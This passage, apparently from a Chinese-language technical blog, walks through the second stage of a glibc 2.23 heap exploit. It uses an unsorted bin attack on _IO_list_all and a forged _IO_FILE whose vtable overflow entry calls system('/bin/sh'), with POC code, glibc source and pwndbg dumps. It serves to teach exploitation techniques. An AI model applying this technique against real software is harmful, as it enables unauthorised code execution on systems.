class="number">0x0000000000020ff1</span></span><br><span class="line"><span class="number">0x624020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x624030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x624040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>下面开始第二阶段的利用，这里利用的是每当触发_IO_flush_all_lockp时，_IO_flush_all_lockp刷新所有的文件指针，即遍历_IO_list_all链中的每一项，分别调用_IO_OVERFLOW。所以这个POC的想法是使用伪文件指针覆盖_IO_list_all链中的文件指针，该fake FILE的_IO_OVERFLOW指向system，该FILE结构的前8个字节设置为“/bin/sh”，所以当调用_IO_OVERFLOW(fp, EOF)其实是调用system(“/bin/sh”)。这是第二阶段的思路。libc触发_IO_flush_all_lockp有以下三种情况：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc触发abort时</span><br><span class="line">执行exit函数时</span><br><span class="line">程序执行流从main函数返回时</span><br></pre></td></tr></table></figure></p>
+<p>首先需要修改_IO_list_all中的内容，伪造一个fake _IO_FILE，这里利用UnsortedBin Attack将_IO_list_all的值修改为main_arena+0x58，然后在main_arena中构造fake _IO_FILE。假设有一个上文中的溢出可以修改top chunk，在第二阶段中再次使用此溢出来覆盖释放到unsorted bin中的旧的top chunk的fd和bk指针，将bk指针修改为_IO_list_all-0x10，这样在后续试图分割unsortedbin中的free chunk来满足分配请求时，该free chunk-&gt;bk-&gt;fd会被覆盖到main_arena的地址空间中，也就是我们所说的UnsortedBin Attack。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 ./malloc/malloc.c      </span></span><br><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">			<span class="comment">//bck已经被我们修改，因此这里的条件不满足</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; <span class="comment">//unsorted_chunks (av)-&gt;bk = _IO_list_all - 0x10</span></span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av); <span class="comment">//_IO_list_all - 0x10 + 0x10 = unsorted_chunks (av)</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>
+<p>覆盖之前该chunk的fd和bk指针的状态是指向main_arena，_IO_list_all中的内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x602400</span>  <span class="comment">#old top chunk</span></span><br><span class="line"><span class="number">0x602400</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000be1</span></span><br><span class="line"><span class="number">0x602410</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE_plus **) <span class="number">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x7ffff7dd2520</span></span><br><span class="line"><span class="number">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;:	<span class="number">0x00007ffff7dd2540</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2530</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_&gt;:	<span class="number">0x00000000fbad2887</span>	<span class="number">0x00007ffff7dd25c3</span></span><br><span class="line"><span class="number">0x7ffff7dd2550</span> &lt;_IO_2_1_stderr_+<span class="number">16</span>&gt;:	<span class="number">0x00007ffff7dd25c3</span>	<span class="number">0x00007ffff7dd25c3</span></span><br></pre></td></tr></table></figure>
+<p>覆盖之后，_IO_list_all的值修改为main_arena+0x58。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE_plus **) <span class="number">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x7ffff7dd2520</span></span><br><span class="line"><span class="number">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2530</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_&gt;:	<span class="number">0x00000000fbad2887</span>	<span class="number">0x00007ffff7dd25c3</span></span><br><span class="line"><span class="number">0x7ffff7dd2550</span> &lt;_IO_2_1_stderr_+<span class="number">16</span>&gt;:	<span class="number">0x00007ffff7dd25c3</span>	<span class="number">0x00007ffff7dd25c3</span></span><br><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$<span class="number">2</span> = (struct malloc_state *) <span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;</span><br></pre></td></tr></table></figure>
+<p>在执行_IO_flush_all_lockp时，会通过_IO_FILE结构体的_chain成员寻找下一个_IO_FILE，如果_IO_list_all的值修改为main_arena+0x58时，_chain成员偏移位置恰好在smallbin[4]的头部。如果将旧的top chunk的大小修改为0x61(prev_inuse位必须为1)，当请求分配一个较小的分配时，unsorted bin中的chunk会进入对应大小的bin中，在64位系统中，0x60恰好是smallbin[4]，前面依次是0x20、0x30、0x40、0x50。而smallbin[4]中是空的，因此旧的top chunk将在smallbin[4]的头部。也就进入以_IO_list_all为头部的_IO_FILE链中。<br>所以要修改旧的top chunk的大小为0x61，并在旧的top chunk中伪造_IO_FILE结构，参考_IO_flush_all_lockp源码，想要调用_IO_OVERFLOW (fp, EOF)，_IO_FILE需要满足几个条件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 ./libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain; <span class="comment">//寻找下一个_IO_FILE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据libc中的_IO_flush_all_lockp实现可以知道需要满足以下条件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>
+<p>在POC中是选择满足了第一种条件：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">top[<span class="number">1</span>] = <span class="number">0x61</span>;  <span class="comment">//修改top chunk的size域为0x61。</span></span><br><span class="line"><span class="comment">//Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"><span class="comment">//Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来考虑如何将fake _IO_FILE的_IO_OVERFLOW指向system，首先fake FILE的前8个字节是”/bin/sh”:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure></p>
+<p>考虑_IO_flush_all_lockp是如何找到_IO_FILE的_IO_OVERFLOW的呢？在前面文件结构的介绍可知是通过虚表指针vtable，vtable的地址位于_IO_FILE之后，也就是base_address+sizeof(_IO_FILE) = jump_table，在libc2.23中，32位vtable在_IO_FILE_plus结构体的偏移是0x94，64位偏移是0xd8。其中，_IO_OVERFLOW函数指针在结构体_IO_jump_t中偏移为0x18，下标为3。在POC中是这样构造的，将_IO_OVERFLOW指针指向winner函数，winner函数中调用了system函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table;</span><br></pre></td></tr></table></figure></p>
+<p>最后申请堆内存触发chunks进入对应的bins，旧的top chunk进入smallbin[4]中，我们伪造的fake _IO_FILE进入_IO_list_all中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure></p>
+<p>在main_arena+0x58处伪造的_IO_list_all如下所示，_chain中指向下一个_IO_FILE，也就是我们在旧的top chunk中伪造的fake _IO_FILE。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (*(struct _IO_FILE_plus*) <span class="number">0x7ffff7dd1b78</span>)  <span class="comment">#main_arena+0x58</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">6438928</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x602400</span> <span class="string">"/bin/sh"</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd2510</span> <span class="string">""</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">"\210\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">"\210\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7dd1ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">"\230\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x7ffff7dd1ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">"\230\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x7ffff7dd1bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">"\250\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x7ffff7dd1bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">"\250\033\335\367\377\177"</span>, </span><br><span class="line">    _markers = <span class="number">0x602400</span>, </span><br><span class="line">    _chain = <span class="number">0x602400</span>,  <span class="comment">#old top chunk</span></span><br><span class="line">    _fileno = <span class="number">-136504360</span>, </span><br><span class="line">    _flags2 = <span class="number">32767</span>, </span><br><span class="line">    _old_offset = <span class="number">140737351850968</span>, </span><br><span class="line">    _cur_column = <span class="number">7144</span>, </span><br><span class="line">    _vtable_offset = <span class="number">-35</span> <span class="string">'\335'</span>, </span><br><span class="line">    _shortbuf = &lt;incomplete sequence \<span class="number">367</span>&gt;, </span><br><span class="line">    _lock = <span class="number">0x7ffff7dd1be8</span> &lt;main_arena+<span class="number">200</span>&gt;, </span><br><span class="line">    _offset = <span class="number">140737351851000</span>, </span><br><span class="line">    _codecvt = <span class="number">0x7ffff7dd1bf8</span> &lt;main_arena+<span class="number">216</span>&gt;, </span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd1c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x7ffff7dd1c08</span> &lt;main_arena+<span class="number">232</span>&gt;, </span><br><span class="line">    _freeres_buf = <span class="number">0x7ffff7dd1c18</span> &lt;main_arena+<span class="number">248</span>&gt;, </span><br><span class="line">    __pad5 = <span class="number">140737351851032</span>, </span><br><span class="line">    _mode = <span class="number">-136504280</span>, </span><br><span class="line">    _unused2 = <span class="string">"\377\177\000\000(\034\335\367\377\177\000\000\070\034\335"</span>...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7ffff7dd1c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在旧的top chunk中伪造的_IO_FILE结构如下所示，续表指针指向0x602460。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (*(struct _IO_FILE_plus*) <span class="number">0x602400</span>)</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>,  <span class="comment">#0x6e69622f /bin/sh</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">"\270\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">"\270\033\335\367\377\177"</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">4196239</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x602460</span> <span class="comment">#jump table</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在0x602460处的函数跳转表中，第三项为_IO_OVERFLOW函数指针，指向winner函数，调用winner(“/bin/sh”)相当于调用system(“/bin/sh”)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (*(struct _IO_jump_t *)<span class="number">0x602460</span>)</span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x40078f</span> &lt;winner&gt;,  <span class="comment">#winner("/bin/sh")调用system("/bin/sh")</span></span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x602460</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
